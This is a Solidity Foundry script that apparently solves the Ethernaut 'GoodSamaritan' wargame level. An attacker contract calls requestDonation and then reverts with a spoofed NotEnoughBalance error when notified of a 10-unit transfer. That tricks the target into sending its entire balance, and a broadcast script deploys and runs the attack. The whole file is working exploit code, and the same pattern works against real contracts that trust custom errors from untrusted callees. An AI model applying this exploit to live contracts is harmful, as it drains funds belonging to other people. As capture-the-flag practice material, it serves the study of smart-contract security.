// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract Attack {

    error NotEnoughBalance();

    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        IGoodSamaritan(target).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attacker = new Attack(target);
        attacker.attack();

        vm.stopBroadcast();
    }
}